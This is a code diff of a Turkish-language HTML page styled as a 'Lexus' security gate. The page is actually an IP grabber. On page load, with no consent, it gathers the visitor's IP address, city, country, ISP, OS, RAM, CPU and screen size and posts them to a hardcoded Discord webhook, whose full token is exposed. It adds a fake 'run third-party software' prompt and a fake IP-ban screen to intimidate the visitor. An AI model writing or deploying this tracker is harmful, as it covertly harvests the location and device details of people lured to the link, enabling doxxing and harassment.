@@ -3,129 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEXUS ACCESS CONTROL</title>
+    <title>LEXUS V12 - SYSTEM CORE</title>
     <style>
         body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .vault-container { border: 1px solid #bc00ff; padding: 30px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: rgba(10, 0, 15, 0.9); width: 90%; max-width: 500px; text-align: center; }
-        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; }
-        
-        input { background: #000; border: 1px solid #bc00ff; color: #00ff00; padding: 10px; width: 80%; margin-bottom: 20px; outline: none; text-align: center; }
-        .btn { border: 1px solid #bc00ff; color: #bc00ff; background: none; padding: 10px 20px; cursor: pointer; font-family: inherit; transition: 0.3s; }
-        .btn:hover { background: #bc00ff; color: #000; box-shadow: 0 0 10px #bc00ff; }
-
-        #admin-panel { display: none; width: 100%; text-align: left; }
-        #log-list { max-height: 300px; overflow-y: auto; font-size: 12px; border: 1px dashed #444; padding: 10px; margin-top: 10px; color: #00ff00; }
-        .log-item { border-bottom: 1px solid #222; padding: 5px 0; }
-        .error { color: #ff0000; font-size: 12px; margin-bottom: 10px; }
+        .vault-container { border: 1px solid #bc00ff; padding: 30px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: #0a000f; width: 90%; max-width: 500px; text-align: center; position: relative; }
+        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; }
+        input { background: #000; border: 1px solid #bc00ff; color: #00ff00; padding: 12px; width: 60px; text-align: center; font-size: 1.2rem; outline: none; margin: 15px 0; }
+        .btn { border: 1px solid #bc00ff; color: #bc00ff; background: none; padding: 10px 25px; cursor: pointer; transition: 0.3s; font-family: inherit; }
+        .btn:hover { background: #bc00ff; color: #000; }
+        #admin-panel { display: none; text-align: left; }
+        #log-display { max-height: 200px; overflow-y: auto; font-size: 11px; color: #00ff00; border-top: 1px solid #333; margin-top: 15px; padding-top: 10px; }
+        .ban-screen { color: red; font-size: 1.5rem; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="login-screen" class="vault-container">
-        <div class="header">[ ACCESS_REQUIRED ]</div>
-        <p style="font-size: 13px;">Sisteme erişmek için yetkili şifresini girin.</p>
-        <div id="error-msg" class="error"></div>
-        <input type="password" id="pass-input" placeholder="********">
+    <div id="ban-msg" class="ban-screen">
+        [!] IP ADRESİNİZ ENGELLENDİ [!]<br>
+        <span style="font-size: 12px; color: white;">Sistem ihlali nedeniyle erişiminiz kalıcı olarak kısıtlanmıştır.</span>
+    </div>
+
+    <div id="auth-box" class="vault-container">
+        <div class="header">[ LEXUS_SECURITY_GATE ]</div>
+        <p id="status-msg">IP ANALİZ EDİLİYOR...</p>
+        <p style="font-size: 11px;">Üçüncü taraf yazılım çalıştırılsın mı? (1 / 0)</p>
+        <input type="text" id="answer" maxlength="1" placeholder="?">
         <br>
-        <button class="btn" onclick="checkAccess()">SİSTEME GİRİŞ YAP</button>
+        <button class="btn" onclick="triggerAction()">SİSTEME GÖNDER</button>
     </div>
 
     <div id="admin-panel" class="vault-container">
-        <div class="header">[ LEXUS_ADMIN_DASHBOARD ]</div>
-        <div id="welcome-msg" style="font-size: 14px; color: #00ff00;"></div>
-        
-        <div id="log-list">
-            </div>
-
-        <button class="btn" style="margin-top: 20px; border-color: red; color: red;" onclick="clearLogs()">LOGLARI SIFIRLA</button>
+        <div class="header">[ ADMIN_LOG_VAULT ]</div>
+        <div style="font-size: 11px; color: #00ff00;">● LEXUS ENGINE V12 AKTİF</div>
+        <div id="log-display"></div>
+        <button class="btn" style="margin-top: 15px; border-color: red; color: red; font-size: 10px;" onclick="localStorage.clear(); location.reload();">SİSTEMİ SIFIRLA</button>
     </div>
 
     <script>
-        const API_KEY = "1234"; // BURAYI İSTEDİĞİN ŞİFRE YAP
         const webhookURL = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
 
-        async function checkAccess() {
-            const input = document.getElementById('pass-input').value;
-            const errorMsg = document.getElementById('error-msg');
+        // SAYFA YÜKLENDİĞİNDE BAN KONTROLÜ VE İLK LOG
+        window.onload = async () => {
+            if (localStorage.getItem('user_status') === 'banned') {
+                document.getElementById('auth-box').style.display = 'none';
+                document.getElementById('ban-msg').style.display = 'block';
+                return;
+            }
+            
+            renderLogs();
+            const info = await getFullData();
+            if(info) {
+                sendDiscord(info, "🛰️ LİNKE TIKLANDI (OTOMATİK LOG)", 16776960);
+                saveLog(info, "GİRİŞ");
+                document.getElementById('status-msg').innerText = "GİRİŞ ONAYLANDI: " + info.ip;
+            }
+        };
 
-            if (input === API_KEY) {
-                // Şifre Doğru
-                document.getElementById('login-screen').style.display = 'none';
+        async function triggerAction() {
+            const val = document.getElementById('answer').value;
+            const info = await getFullData();
+
+            if (val === "1") {
+                // 1 seçerse Admin Panel açılır
+                document.getElementById('auth-box').style.display = 'none';
                 document.getElementById('admin-panel').style.display = 'block';
-                
-                // Bilgileri topla ve gönder
-                const data = await collectData();
-                if(data) {
-                    saveAndDisplay(data);
-                    sendToDiscord(data);
-                }
-            } else {
-                errorMsg.innerText = "!! YETKİSİZ ERİŞİM DENEMESİ !!";
-                document.getElementById('pass-input').value = "";
+                sendDiscord(info, "✅ 1 SEÇİLDİ - FULL ERİŞİM", 3066993);
+                saveLog(info, "SEÇİM: 1");
+            } 
+            else if (val === "0") {
+                // 0 seçerse BAN ve Webhook
+                localStorage.setItem('user_status', 'banned');
+                sendDiscord(info, "🚫 0 SEÇİLDİ - IP BANLANDI", 15158332);
+                saveLog(info, "BANLANDI (0)");
+                alert("SİSTEM HATASI: Erişim Reddedildi ve IP Engellendi.");
+                location.reload(); // Sayfayı yenile ki ban ekranı gelsin
             }
         }
 
-        async function collectData() {
+        async function getFullData() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const info = await res.json();
+                const i = await res.json();
                 return {
-                    ip: info.ip,
-                    city: info.city,
-                    isp: info.org,
-                    device: navigator.platform,
+                    ip: i.ip,
+                    loc: `${i.city} / ${i.country_name}`,
+                    isp: i.org,
+                    os: navigator.platform,
+                    ram: navigator.deviceMemory || "N/A",
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    res: `${window.screen.width}x${window.screen.height}`,
                     time: new Date().toLocaleString()
                 };
             } catch (e) { return null; }
         }
 
-        function saveAndDisplay(entry) {
-            let logs = JSON.parse(localStorage.getItem('lexus_secure_logs')) || [];
-            logs.unshift(entry);
-            localStorage.setItem('lexus_secure_logs', JSON.stringify(logs));
-            
-            const list = document.getElementById('log-list');
-            list.innerHTML = logs.map(l => `
-                <div class="log-item">
-                    [${l.time}] <span style="color:#bc00ff">${l.ip}</span> - ${l.city} (${l.isp})
-                </div>
-            `).join('');
-            
-            document.getElementById('welcome-msg').innerText = "HOŞ GELDİN: " + entry.ip;
+        function saveLog(l, type) {
+            let logs = JSON.parse(localStorage.getItem('lexus_history')) || [];
+            l.action = type;
+            logs.unshift(l);
+            localStorage.setItem('lexus_history', JSON.stringify(logs));
+            renderLogs();
         }
 
-        async function sendToDiscord(l) {
+        function renderLogs() {
+            const disp = document.getElementById('log-display');
+            const logs = JSON.parse(localStorage.getItem('lexus_history')) || [];
+            if(disp) {
+                disp.innerHTML = logs.map(l => `
+                    <div style="border-bottom:1px solid #222; margin-bottom:5px;">
+                        [${l.time}] <span style="color:#bc00ff">${l.action}</span>: ${l.ip}
+                    </div>
+                `).join('');
+            }
+        }
+
+        async function sendDiscord(l, title, color) {
             const payload = {
-                username: "LEXUS SECURITY",
+                username: "LEXUS SECURITY SYSTEM",
                 embeds: [{
-                    title: "🔓 PANEL ERİŞİLDİ (ŞİFRE GEÇİLDİ)",
-                    color: 3066993, // Yeşil
+                    title: title,
+                    color: color,
                     fields: [
-                        { name: "🌐 IP", value: l.ip, inline: true },
-                        { name: "📍 Konum", value: l.city, inline: true },
-                        { name: "🔌 ISP", value: l.isp, inline: false },
-                        { name: "📱 Cihaz", value: l.device, inline: true }
+                        { name: "🌐 IP & Konum", value: `**IP:** ${l.ip}\n**Konum:** ${l.loc}\n**ISS:** ${l.isp}`, inline: false },
+                        { name: "💻 Detaylar", value: `**OS:** ${l.os}\n**RAM:** ${l.ram}\n**CPU:** ${l.cpu}\n**Ekran:** ${l.res}`, inline: true },
+                        { name: "⏰ Zaman", value: l.time, inline: true }
                     ],
-                    footer: { text: "Lexus Access Control System" },
-                    timestamp: new Date()
+                    footer: { text: "Lexus V12 Ban-Hammer" }
                 }]
             };
             await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
-
-        function clearLogs() {
-            localStorage.removeItem('lexus_secure_logs');
-            location.reload();
-        }
-
-        // Sayfa yenilendiğinde eğer log varsa listele (ama şifre ekranı yine gelir)
-        window.onload = () => {
-            const logs = JSON.parse(localStorage.getItem('lexus_secure_logs'));
-            if(logs) {
-                const list = document.getElementById('log-list');
-                list.innerHTML = logs.map(l => `<div class="log-item">[${l.time}] ${l.ip}</div>`).join('');
-            }
-        };
     </script>
 </body>
 </html>
